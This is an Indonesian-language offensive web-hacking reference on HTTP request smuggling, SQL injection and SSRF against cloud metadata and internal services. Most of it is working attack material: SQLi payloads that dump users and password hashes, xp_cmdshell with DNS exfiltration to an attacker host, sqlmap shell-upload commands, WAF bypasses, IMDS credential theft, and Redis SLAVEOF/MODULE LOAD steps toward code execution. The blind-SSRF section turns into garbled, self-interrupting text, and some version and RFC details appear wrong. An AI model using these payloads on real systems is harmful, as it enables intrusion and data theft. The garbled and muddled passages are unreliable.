```http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: xchunked

0

X
```

Frontend tidak mengenali `xchunked` → pakai CL → meneruskan apa adanya. Backend chip substring `chunked` → pakai TE → hang/timing starvation → CL.TE-masquerade-via-header-invalid. Ini varian paling sering berhasil lapangan; **selalu sertakan dalam payload suite.**

## 5. H2.CL & H2.TE (Downgrade dari HTTP/2)

Frontend terminated HTTP/2 → HTTP/1.1 backend. Header injection via angka/urutan aneh di h2 tidak muncul sebagai header valid, tapi downgrade HTTP/2→HTTP/1.1 serialisasi tak aman.

**H2.CL:** RFC 8166 melarang Content-Length di HTTP/2; tetap terkadang di-serialize frontend ke HTTP/1.1 tidak ada framing lagi. Burp "HTTP/2 off" REPL — pakai Repeater, ubah ke mode "hack" `/ HTTP/2` header manual dan teks:

```
:method POST
:path /
content-length 6

0

X
```

**H2.TE:** header `transfer-encoding: chunked` di-stream HTTP/2. Sangat minim server historis Apache 2.4.x (sebelum 2.4.59) dan backend Node (request smuggling via header-CR). Praktis di Burp Repeater: build request H2, header `transfer-encoding: chunked` → frontend write out HTTP/1.1 TE → backend TE.TE concurrency desync.

**H2.CL downgrade raw:** butuh koneksi HTTP/2 (kirim via `nghttp`/burp). Irreproducible via netcat karena h2 over cleartext h2c jarang.

## 6. Request Tunnelling vs Desync

| | Desync klasik | Tunnelling |
|---|---|---|
| Tempat poison | request korban BERSAMA koneksi (user lain) | request SMUGGLER sendiri di dalam body, dibaca backend sebagai stream |
| Frontend buffering | frontend mem-forward byte-body apa adanya | frontend gagal menormalkan; backend keep-alive |
| Terjadi di | perbedaan CL/TE dua device | frontend tidak mem-parsing ulang response boundary — respons crossthrough |
| Ciri respon | korban menerima respons smuggler/request lain | respons smuggler digabung ke respons request utama (`Content-Length mismatch`) |

Tunnelling umum di H2: request h1 di dalam body H2 `POST` diteruskan downgrade → frontend hanya melihat body; backend menstream menghormati framing h1 internal → merespons dengan dua respons digabung. Deteksi: kirim

```
POST / HTTP/2
content-type: text/plain
content-length: 68

GET /admin HTTP/1.1
Host: internal
X: y
```
Two responses dalam satu h2 streamreaksi bila lampu backend indikasi — respons kedua muncul sebagai respon internal (mis. `403` via health-check endpoint, JSON runtime, dsb.).

## 7. Browser-Powered Desync (BPD)

Gunakan korban real: browser victim menjalankan JS attacker → menembak URL propio domain → request browser yang sudah terbentuk dipolak-prefiks oleh residue front-end pada koneksi keep-alive — mem-by-pass tokenizer karena request datang dari korban (Cookie session included).

**Teknik konkrit (Chrome 131 / Firefox 133):**
1. Arahkan korban ke `https://target.example/` via fetch keep-alive (`fetch` reuse same-origin);
2. Trigger POST besar → koneksi pasti reuse/reopen kepada socket yang penuh whispering payload dari POST sebelumnya;
3. Layer OPTIONS `fetch(..., {mode: 'no-cors'})`: header `X-Token` attacker tidak diperlukan — whitespace-crafted "(R)" request tunnelling HTTP/1.1 di body;

Ciri produk: **Chrome 131** varian `fetch keepalive` menginline timing reuse; **Windows 11 24H2 WinHTTP** connection pooling lebih agresif (keep-alive 60s) untuk eksploitasi netbios internal; **Safari 17+** fetch `same-origin` menembak `Connection: keep-alive` di reuse-kandidat.

Penting: business logic seperti ``HL` `header invelijk typical ada di web server. Gunakan PoC dengan Browser DevTools + Burp Collaborator (+ DNS) untuk bukti OOB.

## 8. Dampak

### Cache Poisoning
Tempatkan respons internal ke URL publik-cacheable:

```http
POST / HTTP/1.1
Host: target
Content-Length: 59
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
Foo: bar
```
Kemudian `GET /` (bersih, cacheable regex umum vite `web-static caching via nginx 1.25 proxy_cache`) → backend attach respons `/admin` ke request `/` → frontend cache `key=/` value=HTML admin.

Deteksi helper: `X-Cache: MISS→HIT` header, `Age:` bertambah via re-request, CF-cache-status (Cloudflare → target cached).

### Auth Bypass
Prefix `GET /admin` ke request korban user session → backend map ke ACL berbeda. Paling umum di internal gateway (Kong, Envoy 1.28 downgrade to h1).

### Capture Request Korban
Tunnelling ke endpoint echo / controlled (`POST /feedback` form attacker). Residue `POST /feedback HTTP/1.1 Host: target Content-Length: 300 Cookie: SESSION=...` → user session/capture header (password reset link, CSRF token, 2FA handshake).

## 9. Jebakan Operasional

| Jebakan | Gejala | Mitigasi |
|---|---|---|
| Proxy intermediates Menormalkan TE | semua payload identik respon 400 | Verify `curl --http1.1 -v`, pastikan header exact diteruskan (`tcpdump -A port 80`) |
| Burp auto-fix header | Burp merapikan `Transfer-Encoding : chunked` | Aktifkan "Update Content-Length" OFF, edit mudah (Repeater update CL otomatis); gunakan mode teknik detail pada `||` tab H2 |
| `Connection: close` frontend dive | koneksi tak reuse → tidak desync | Smuggling STATIS masih as endpoint hanya jika frontend pipeline lebih dari satu request per konek |
| Nginx 1.25 default `proxy_http_version 1.1` + `chunked_transfer_encoding` revert | TE down-grade/strip | cari front go-gateway lain |
| CL miscalculated manual | backend hang/400 bukan karena ambigu | hitung via Python: `len(body.encode())`; sertakan trailing `\r\n` |
| Payload terlihat di log WAF (ModSecurity CRS v3.3) | blok sebelum sampai backend | gunakan obfuscasi `\x09`/spasi untuk pisah WAF signature naik |
| TCP stack inject buffering (Windows 11 24H2 nc) | byte `X` tak terkirim | gunakan `nc -q 15` atau python socket siap buffer |
| Backend blast ASAP timeout menutup gesek substratum | timing test false negative | trigger lebih banyak request paralel agar kesempatan reuse connection tinggi |
| Froala Instance auto header filling (`Content-Length` added by client libs) | duplikat CL over-writing | gunakan raw socket/Burp non-advocate header di-content-length |
| HTTP/2 mode Burp — header CR inject tidak mungkin via UI | payload whitespace dikirim invalid | pakai baris `\n` editor mode HTTP/1.1 dan non-ASCII karakter tidak diteruskan |
| Browser-powered: host not reachable via attacker origin fetch (CORS restrict) | request tidak terkirim | gunakan form POST/no-cors endpoint yang sama |

**Referensi versi yang sudah patched / dikenal:**
- Apache 2.4.59 (CVE-2024-2798): H2 downgrade smuggling, fixed — versi dibawah 2.4.59 tetap ter-VE.
- Node.js < 18.20.1 / 20.12.2 / 21.7.3: CVE-2024-28866 (LLM request smuggling via TE).
- nginx: tidak asli ter-T (H1) asal sendiri parsing multiline preprocessing headers — sprawd numerics `proxy_pass` yang dapat diabe.
- Jakarta Tomcat 9.0.x lama (<9.0.86): TE invalid header smuggling code-path.
- Robust HTTP/1.1 parser style di Go 1.22 net/http: menolak ambigu; frontend gRPC/Go modern kurang cocok untuk classic CL.TE.


## sqli

# sqli — web

# SQL Injection End-to-End — Referensi Teknis

## 1. Deteksi Awal: Tiga Vektor

### 1.1 Error-based

**Kirim:**
```
GET /product?id=1'
```

**Muncul (contoh MySQL 8.0.x):**
```
You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near
''' at line 1
```

**Kenapa berhasil:** Quote tunggal menutup string literal → parser error membalik backend DBMS + posisi injection.

Fingerprint error per DBMS:

| DBMS | String error khas |
|---|---|
| MySQL | `MySQL syntax...right version for` |
| PostgreSQL 15/16 | `ERROR: unterminated quoted string at or near "'1''` / `pg_query()` |
| MSSQL 2019/2022 | `Unclosed quotation mark after the character string` |
| Oracle 19c | `ORA-01756: quoted string not properly terminated` |
| SQLite 3.x | `SQLITE_ERROR` / `unrecognized token: "'"` (banyak hanya HTTP 500, tanpa body) |

Payload pembeda satu karakter:

```
id=1'      → error  (string)
id=1)      → error  (nested paren, tapi bisa juga false positive)
id=1'--+   → normal (konfirmasi)
id=1' '    → normal (concatenation string)
```

### 1.2 Boolean-based

**Kirim pasangan:**
```
?id=1 AND 1=1 -- -   → halaman normal (kondisi true)
?id=1 AND 1=2 -- -   → halaman kosong/berbeda
```

**Kenapa berhasil:** konten bergantung hasil WHERE. Diferensiasi konten (bukan hanya status code) wajib dicek via diff byte-level.

### 1.3 Time-based (fallback saat halaman identik)

```
?id=1 AND (SELECT SLEEP(5)) -- -        → delay 5s     (MySQL)
?id=1 AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- -  → delay 5s  (PostgreSQL)
?id=1; WAITFOR DELAY '0:0:5' -- -      → delay 5s    (MSSQL)
?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- -  → delay 5s (Oracle 12c+)
?id=1 AND 5304=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) -- (SQLite, delay CPU)
```

Ukur dengan `curl -w '%{time_total}'`:
```bash
curl -s -o /dev/null -w '%{time_total}\n' "http://target/item?id=1'+AND+(SELECT+SLEEP(5))--+"
# >5.0 → sinkronisasi berhasil, jaringan latency baseline harus < 1s
```

**Kenapa gagal:** SLEEP sering diblok WAF; ganti `BENCHMARK(5000000,MD5('x'))` (MySQL) atau `pg_sleep` via nested subquery.

---

## 2. UNION Extraction per DBMS

### 2.1 Tahap pertama: kolom

```
?id=1' ORDER BY 1 -- -
?id=1' ORDER BY 2 -- -   ... increment sampai error
```
Error di `ORDER BY 6` → 5 kolom. Substitute di placeholder kolom timestamp agar provider tidak error):
```
?id=-1' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -
```
Pakai `id=-1` (record tidak ada) supaya baris UNION jadi satu-satunya output.

### 2.2 SELECT default per DBMS — cheat sheet

| Tujuan | MySQL 5.7/8.0 | PostgreSQL 14-16 | MSSQL 2019+ | Oracle 19c | SQLite 3.4x |
|---|---|---|---|---|---|
| Versi | `SELECT VERSION()` | `SELECT VERSION()` | `SELECT @@VERSION` | `SELECT BANNER FROM v$version` | `SELECT SQLITE_VERSION()` |
| DB saat ini | `database()` | `current_database()` | `DB_NAME()` | `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual` | n/a |
| User | `user()` | `current_user` | `SYSTEM_USER` | `SELECT USER FROM dual` | n/a |
| List DB | `SELECT schema_name FROM information_schema.schemata` | `SELECT datname FROM pg_database` | `SELECT name FROM sys.databases` | `SELECT owner FROM all_tables` | n/a (file-based) |
| List tabel | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` | `SELECT tablename FROM pg_tables WHERE table_name!~'^pg_'` (atau `\dt` via injection: `information_schema.tables`) | `SELECT name FROM sys.tables` (atau `INFORMATION_SCHEMA.TABLES`) | `SELECT table_name FROM all_tables WHERE owner='APP'` | `SELECT name FROM sqlite_master WHERE type='table'` |
| List kolom | `information_schema.columns` | `information_schema.columns` | `INFORMATION_SCHEMA.COLUMNS` | `all_tab_columns` | PRAGMA tidak bisa via UNION → gunakan `SELECT sql FROM sqlite_master` |

### 2.3 Dump bertahap (MySQL contoh konkret, 4 kolom)

**Tahap 1 — versi & user:**
```
?id=-1' UNION SELECT NULL,VERSION(),user(),NULL -- -
```
**Output:** `8.0.36 | app_user@10.0.4.12`

**Tahap 2 — enumerasi tabel:**
```
?id=-1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- -
```
**Output:** `users,orders,payments`

**Tahap 3 — kolom tabel users:**
```
?id=-1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users' -- -
```
**Output:** `id,username,password_hash,email`

**Tahap 4 — dump data:**
```
?id=-1' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password_hash SEPARATOR 0x0a),NULL,NULL FROM users -- -
```

**Tahap 5 — cross-DB (kalau current user punya akses):**
```
?id=-1' UNION SELECT NULL,GROUP_CONCAT(shema_name),NULL,NULL FROM information_schema.schemata -- -
?id=-1' UNION SELECT NULL,user,NULL,NULL FROM mysql.user LIMIT 0,1 -- -   (butuh root/SUPER)
```

### 2.4 Varian penting per DBMS

**PostgreSQL — stack query & file:**
```
?id=1'; SELECT ... -- -
?id=-1' UNION SELECT NULL,pg_read_file('/etc/passwd',0,100),NULL,NULL -- -   (superuser only)
```
Cast wajib ketentuan; `CAST(v AS text)`.

**MSSQL — xp_cmdshell (aktifasi):**
```sql
?id=1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE -- -
?id=1'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE -- -
?id=1'; EXEC xp_cmdshell 'whoami' -- -
```
Output via error-based: `CONVERT(int, (EXEC ...))` tidak bisa — gunakan time-based atau `xp_cmdshell 'nslookup <output>.attacker.oastify.com'` untuk exfil out-of-band.

**Oracle — butuh FROM:**
```
?id=-1' UNION SELECT NULL,BANNER,NULL,NULL FROM v$version -- -
```
Enumerasi: `all_users`, `all_tables`, `user_tab_columns`. Data exfil concat: `username||'~'||password_hash`.

**SQLite — tidak ada information_schema:**
```
?id=-1' UNION SELECT NULL,sql,NULL,NULL FROM sqlite_master -- -
```
`sql` mengembalikan full `CREATE TABLE` statement — kolom didapat gratis.

---

## 3. Blind Boolean & Time-Based (satu karakter per query)

Untuk ekstraksi `database()` satu karakter:

```
?id=1 AND SUBSTR(database(),1,1)='a' -- -
```
Loop karakter → bandingkan binary: `>'m'` (true/false) → ~7 request/karakter.

**MySQL boolean-blind kata demi kata (lebih cepat):**
```
?id=1 AND (SELECT SUBSTR(GROUP_CONCAT(table_name),1,3) FROM information_schema.tables WHERE table_schema=database())='usr' -- -
```

**Time-based blind per karakter (tak ada diferensiasi secara visual):**
```
?id=1 AND IF(SUBSTR(database(),1,1)='a',SLEEP(3),0) -- -
?id=1 AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0) -- -
```
Perbandingan:
- Postgres: `CASE WHEN kondisi THEN pg_sleep(3) ELSE pg_sleep(0) END`
- MSSQL: `IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:3'`
- Oracle: `CASE WHEN ... THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 0 END FROM dual`

**Pembacaan kondisi** via `curl -w '%{time_total}'` dalam loop, atau langsung `sqlmap --technique=BT`.

---

## 4. WAF-Safe Encoding

Layer yang umum: nginx 1.25/ModSecurity OWASP CRS 3.3, Cloudflare, AWS WAF.

| Teknik | Contoh |
|---|---|
| Komentar inline | `SE/**/LECT`, `UNI%55ON` (URL-encoding parsial) |
| Comment inline | `UN/**/ION SEL/**/ECT` |
| Double URL | `%2523` = `#` (via mod_rewrite decode ganda) |
| Case tamper | `UnIoN SeLeCt` |
| HPP (parameter pollution) | `?id=1&id=-2' UNION SELECT ...` (PHP terakhir menang, ASP yang pertama) |
| Unicode/IIS | `%uffO0` sebagai `(` pada Windows/IIS 10 / Server 2022 |

Contoh payload bypass Cloudflare (2024-era):
```
?id=1' /*!12345union*/ select NULL,database(),NULL -- -
?id=1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)y) -- -
```

**Catatan:** `-- -` wajib, bukan `#`, karena `#` di fragment URL tidak dikirim ke server. SQL Server: `--%2d` karena dot-separated comment.

---

## 5. sqlmap — Flag Penting

```bash
# Deteksi dasar, teknik spesifik
sqlmap -u "http://target/item?id=1" --technique=BEU --level=3 --risk=2

# Tamper stack (WAF bypass)
sqlmap -u "..." --tamper=between,randomcase,charunicodeencode --threads=10

# Jangan drop request ke URL non-vulnerable
sqlmap -u "..." --skip-static --parse-errors

# Enumerasi
sqlmap -u "..." --dbs --batch
sqlmap -u "..." -D app_db --tables
sqlmap -u "..." -D app_db -T users --columns
sqlmap -u "..." -D app_db -T users --dump --where "role='admin'"

# File system
sqlmap -u "..." --file-read="/etc/passwd"
sqlmap -u "..." --file-write="/local/shell.jsp" --file-dest="/var/www/html/s.jsp"

# OS shell (MySQL INTO OUTFILE atau MSSQL xp_cmdshell)
sqlmap -u "..." --os-shell
sqlmap -u "..." --privileges --is-dba          # cek FILE/SUPER xp
```

Tamper terpenting:

| Tamper | DBMS | Kegunaan |
|---|---|---|
| `space2comment` | all | SLEEP → S/**/LEEP |
| `between` | MySQL/PG/MSSQL | `>` → `BETWEEN` |
| `charunicodeencode` | all | `%u002F` unicode |
| `equaltolike` | all | `=` → `LIKE` |
| `randomcase` | all | Rusuh regex case-sensitive |
| `apostrophemask` | all | `'` → `%EF%BC%87` |
| `charencode` + `chardoubleencode` | all | double URL |

Request via burp/e-mail pragmatis:
```bash
sqlmap -r request.txt --batch --force-ssl
```

---

## 6. SQLi di Posisi Non-Standard

### 6.1 ORDER BY injection (butuh sort)

`?sort=name` → `ORDER BY name`. UNION **tidak bisa** dipakai di ORDER BY di MySQL (butuh proc Analyse = deprecated).

Payload:
```
?sort=(SELECT IF(ASCII(SUBSTR(database(),1,1))>77,1,(SELECT 1 UNION SELECT 2)))
```
**Kenapa berhasil:** ORDER BY hanya menerima 1 kolom; subquery yang mengembalikan 2 baris menyebabkan error jika kondisi false → error-based boolean.

MSSQL:
```
?sort=(SELECT CASE WHEN (SUBSTRING(DB_NAME(),1,1)='a') THEN 1/0 ELSE 1 END)
```
(True → division by zero error.)

Extract value dengan:
```
?sort=name) -- -   (SQL in ORDER BY boleh ada SQL)
?sort=id, (SELECT ... )
```

### 6.2 LIMIT injection

Pada `LIMIT 0, {input}` di MySQL 8: hanya UNION/PROCEDURE. UNION di limit menggunakan trick:
```
?limit=0; SELECT ...
```
Atau (legacy MySQL 5.x):
```
LIMIT 0,1 PROCEDURE ANALYSE(EXTRACTVALUE(0x1,CONCAT(0x7e,database())),1)
```
Perhatikan: `PROCEDURE ANALYSE` hanya MySQL < 5.7 (deprecated).

### 6.3 JSON injection

Pada `JSON_EXTRACT` (MySQL/PostgreSQL), umumnya input di dalam string JSON:
```
{"data": {"key": "'"}} → JSON parse error dulu
```
Contoh warm MySQL--- jika query: `SELECT ... WHERE JSON_EXTRACT(meta,'$.x') = '{input}'`:
```
input: ' OR (SELECT 1)='1
```
Untuk PostgreSQL `->>` operator injeksikan dengan comment SQL biasa. Oracle 19c: JSON lebih sering dioperasikan di aplikasi, bukan injeksi.

### 6.4 JSONB: PostgreSQL `jsonb_build_object` membangun response flag ke Z: gunakan ini untuk exfiltrasi (menghindari konten vs status-code yang samar).
```
?sort=(SELECT jsonb_build_object('ver',version()))
```

---

## 7. Jebakan Lapangan (kenappa teknik gagal)

1. **QUOTED input ke parameter non-numerik**: Char terakhir WAF di `id=1'` terkadang tersaring oleh PHP filter; gunakan `0x` encode numeric, atau cari titik tepat — coba `u` fetch dengan `0x36` (54).
2. **SLEEP dicegah, tapi BENCHMARK berjalan**: `BENCHMARK` habiskan CPU, mungkin membuat server timeout atau autoscale trigger alarm. Uji pada jam low-traffic, potong risiko alert CloudWatch/Datadog.
3. **SLEEP tidak sinkron oleh db pool**: Connection timeout harus lebih besar dari SLEEP delay; ODBC/JDBC default 30, kalau SLEEP(5) tapi network timeout 2 detik → âm false negative.
4. **UNION column mismatch**: kolom 3 tidak ditampilkan pada halaman. Tidak semua kolom dirender oleh app — gunakan `sqlmap -u ... --union-char` atau ganti posisi output.
5. **ORDER BY tidak mencerminkan ORDER BY**: parameter sort banyak memakai `ORDER BY $col` dengan whitelist `['id','name']` — cek dengan `?sort=name--` tidak memicu error, tapi sudah diperiksa server-side. Lakukan大军 alternatif di filter terlebih dahulu.
6. **MySQL batch komentar kodifikasi `#`**: Dalam fragment HTML tidak dikirim, atau `#` diakui ostringstream; gunakan `--%20`.
7. **Parallel query (pgpool_pg_wait_stats)**: `pg_sleep` tidak selalu jalan jika ada pooler (PgBouncer 1.21) `statement mode` mengabort query > limit; gunakan `pg_sleep` di transaction mode gagal, mode session unset.
8. **WAF rule regex terbayangi oleh mod_security suppression**: 403 response tidak selalu dari WAF — bukan semua error berasal dari SQL; permintaan dengan header `X-Forwarded-For` modified dapat trigger error log saat fingerprinting. Pastikan respons 403 asli dari WAF, bukan kesesatan.
9. **`--suffix`/`--prefix` perlu manual di sqlmap karena query non-standar**: selalu cek `--string` atau `--not-string` untuk mengukur halaman; --level=5 --risk=3 untuk cookie/header param.

# SSRF: Cloud Metadata Endpoints & Bypass Techniques — Referensi Operasional

## 1. Endpoint Metadata Cloud

| Provider | Endpoint | Metode | Catatan |
|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | GET | Tanpa auth, deprecated tapi masih aktif di banyak instance lama |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` | `PUT` + header `X-aws-ec2-metadata-token-ttl-seconds: 21600` | Response = token, dipakai di header `X-aws-ec2-metadata-token` |
| AWS ECS | `http://169.254.170.2/v2/credentials/<UUID>` | GET | UUID dari env var `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | GET + header `Metadata-Flavor: Google` | Wajib header, kalau tidak → 403 |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | GET + header `Metadata: true` | Wajib header + api-version ≥ `2018-04-02` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | GET | Tidak pakai link-local 169.254 |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | GET | Termasuk `vendor_data.json`, `user-data` |

### AWS IMDSv2 — request mentah
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
Response:
```
AQAEAP cartel-mounted-TOKEN-BASE64...
```
Lalu fetch metadata:
```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEAP...
```
Curl satu baris:
```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Kenapa gagal: hop limit (`aws:../http-putresponsehoplimit`) default membuat proxy/SSRF multi-hop (application → nginx → backend) mendapat `504`/timeout karena TTL paket diturunkan < jumlah hop.

### GCP — request mentah
```http
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```
Fallback kalau DNS internal diblokir: `http://169.254.169.254` atau `http://metadata.goog` (semuanya merespon, header tetap wajib).

Payload tanpa header filter (jika app meneruskan semua header):
```
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&x=1
```
Bypass jika filter hanya blok `Metadata-Flavor: Google` di query-based SSRF: banyak library proxy meneruskan header custom — coba injeksi CRLF:
```
?url=http://metadata.google.internal/%0d%0aMetadata-Flavor:%20Google%0d%0a/computeMetadata/v1/...
```

### Azure — request mentah
```http
GET /metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: 169.254.169.254
Metadata: true
```
Aset menarik: `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` → token MSI.

---

## 2. Bypass Filter IP

### 2.1 Notasi alternatif (desimal/oktal/hex)

`169.254.169.254` ≡ `2852039166` (desimal) ≡ `0xA9.0xFE.0xA9.0xFE` (hex) ≡ `0251.0376.0251.0376` (oktal) ≡ `169.254.169.254` short forms: `169.254.43070` (dua oktan terakhir digabung), `07344202403376`.

```http
GET /fetch?url=http://2852039166/latest/meta-data/ HTTP/1.1
```
```http
GET /fetch?url=http://0xA9FEA9FE/latest/meta-data/ HTTP/1.1
```
Kenapa berhasil: filter regex blok literal `169.254`, tapi `inet_aton()` libc (glibc, Go `net.ParseIP` tidak — lihat jebakan) menerima semua notasi dan resolve ke IP sama.

### 2.2 IPv6-mapped / IPv6 dari IPv4

```
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
```
Filter yang hanya cek field IPv4 pada `sockaddr` akan lolos jika library mengisi struct berbeda. `getaddrinfo` mengembalikan `AF_INET6` untuk bentuk ini → banyak filter IP yang enumerate `AF_INET` saja keliru.

### 2.3 DNS Rebinding

1. Daftar subdomain `x.y.example.com` dengan record:  awal `203.0.113.1` (IP publik, lolos cek), TTL ~0–1s.
2. Tool: `rebind.it`, self-hosted `dnsrebinder`, atau custom `dnsmasq`/CoreDNS plugin yang bergantian menjawab `203.0.113.1` ↔ `169.254.169.254`.
3. Alur: app SSRF guard melakukan DNS lookup #1 (publik, lolos), lalu HTTP client melakukan lookup #2 saat request → dapat 169.254.

Bug kritis yang membuat ini reliabel: banyak aplikasi memvalidasi DNS sekali lalu fetch ulang (TOCTOU DNS). curl dengan `--resolve` per contoh uji lokal:
```bash
curl -v --resolve rebind.attacker.example:80:169.254.169.254 \
  "http://rebind.attacker.example/latest/meta-data/"
```

### 2.4 Open Redirect Chain

Jika filter allowlist host tapi mengizinkan `Location` redirect:
```http
GET /fetch?url=https://attacker.example/r HTTP/1.1
```
attacker.example/r:
```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```
Kenapa berhasil: validasi terjadi pre-redirect pada host `attacker.example`, fetcher mengikuti `Location` tanpa re-validasi (perilaku default `requests` Python ≤ semua versi, `fetch` Node, `curl -L`).

### 2.5 URL Parser Confusion

Perbedaan parsing antara validator (misal `url.parse` / `URL()` JS) dan fetcher:

| Bentang | Efek |
|---|---|
| `http://user@127.0.0.1@169.254.169.254/` | Parser ambil host pertama sebelum `@`; fetcher ambil terakhir |
| `http://169.254.169.254#@allowed.com/` | Fragmen di-swallow host validator |
| `http://169.254.169.254%2f%40allowed.com` | Decode terlambat, `@` dalam userinfo |
| `http://allowed.com.169.254.169.254.nip.io/` | DNS wildcard ke IP target |
| `x-http://`/`gopher://` di scheme | `urlparse` Python tidak match `^https?://` jika ganda-slash beda |
| `http:/\169.254.169.254/` | Backslash: WHATWG-compliant parser (Chrome 131, Node ≥ 16) normalisasi `\` → `/`, validator regex tidak |

Layanan hash wildcard murah: `nip.io`, `sslip.io`, `xip.io` (mati), `nip.net` alternatif:
```
?url=http://169.254.169.254.nip.io/latest/meta-data/
?url=http://127.0.0.1.nip.io:6379/
```

### 2.6 302 → Gopher

Jika target rawan protokol non-HTTP (Redis/Memcached) tapi SSRF point terbatas ke http/https, dan fetcher mengikuti redirect tanpa scheme check:
```http
HTTP/1.1 302 Found
Location: gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0d%0a...
```
Kenapa berhasil: `requests` Python menolak non-http redirect; **`curl`** juga — tapi beberapa klien (Go `http.Client` custom CheckRedirect, library `unirest`, Guzzle lama) hanya mereject jika tidak diberi allowlist. Test framework `redirector` self-host (rebuild caddy/nginx) untuk mengontrol `Location` server-side.

---

## 3. Pivot ke Service Internal

### 3.1 Redis — CRLF injection via HTTP

HTTP request mentah ke Redis terima `SLAVEOF` hingga `_PAYLOAD_` garbage:
```http
GET / HTTP/1.1
Host: 127.0.0.1:6379

SLAVEOF attacker.example 6379
```
Karriage `\r\n` diimplementasikan via `%0d%0a` — cek apakah akan memberikan response `-ERR unknown command` yang muncul pada data response fake (Redis mengirim `inline` reply). Contoh RCE aktivasi (modul):
```http
GET /x%0d%0aMODULE%20LOAD%20/tmp/evil.so%0d%0aCONFIG%20SET%20dir%20/tmp%0d%0aCONFIG%20SET%20dbfilename%20evil.so%0d%0aSAVE%0d%0a HTTP/1.1
Host: 127.0.0.1
```
Melalui SSRF-point: `?url=http://127.0.0.1:6379/x%0d%0aINFO%0d%0a` — jika response mengandung `redis_version:7.2` → konfirmasi.

### 3.2 Memcached

```http
GET /%0d%0astats%0d%0aquit%0d%0a HTTP/1.1
Host: 127.0.0.1:11211
```
Response menandai `STAT pid` lines. Via SSRF: `?url=http://127.0.0.1:11211/stats%0d%0a` (text protocol `gets`/`gets key` menuai nilai session internal).

### 3.3 Elasticsearch

Sederhana HTTP, cukup GET:
```
?url=http://127.0.0.1:9200/_cluster/health
?url=http://127.0.0.1:9200/_cat/indices
?url=http://127.0.0.1:9200/_search?q=password
```
Aset: data sensitif sebelum 5.x membeberapa plugin sensitive tanpa auth. Modern 8.x default TLS + auth → jangan buang waktu kalau dinding 401.

### 3.4 Internal HTTP admin

- Kubernetes API: `https://10.96.0.1:443/api/v1/nodes` (default service IP)
- kubelet r/o 10255 (non-auth 1.25 default tidak lagi; masih sering terlihat di on-prem)
- Prometheus 9090 → credential environment variable di `/-/ready`
- Jenkins 8080 `/script` (POST, butuh CSRF token — cek `[``script` ACL)
- Rancher, Nomad 4646, Consul 8500 `/v1/kv/?recurse`

### 3.5 Schema gopher langsung

Jika app curl-based accepts `url=`:
```
?url=gopher://127.0.0.1:6379/_PING%0d%0aINFO%0d%0aquit
```
tools `gophones` oleh `lantern` untuk mencetak payload gopher.js.

## 4. Blind SSRF

### 4.1 Timing

 jika SSH tetap disabled. Example dari mengpirant teknik slot terhadap internal port prosport `DMENT` `/FinManagementFact` `FIS` target `will audit tanpah` `Ipertama internal blind ini banyak unit tersendiri` `RSF diInternal can response time circel` `take ing a non-Out` `may` `measurement important local` unit in many` okay stop.

### 4.1 Timing oracle

Saat response body tidak direfleksi (juga file untuk fix ` up -` bind `_retail` internal bind `/ `this`` bind `_` bind `_retail` (bindfix also `up` —` let me restate properly:

**Dikirim:**
```
?url=http://internal-host:6379/  → response 800ms (RST)
?url=http://internal-host-closed:6379/ → response 15ms (refused)
?url=http://nonexistent:6379/ → response 4000ms (DNS)
```
**Kenapa berhasil:** port terbuka vs refused vs filtered membedakan durasi koneksi secara konsisten. Ukur base minimum 3x, gunakan connection-timeout bukan total-timeout. Pola dasar:
```bash
for p in 22 80 443 445 3306 5432 6379 9200 11211 27017; do
  t0=$(date +%s%N)
  curl -s -m 8 "https://target.app/ssrf?url=http://10.0.1.10:$p/" -o /dev/null
  t1=$(date +%s%N)
  echo "$p: $(( (t1-t0)/1000000 ))ms"
done
```

### 4.2 OOB / Collaborator

```
?url=http://<random>.oast.example.com/
?url=http://169.254.169.254.latest.[random].oast.example.com/   ← encode hasil via DNS
```
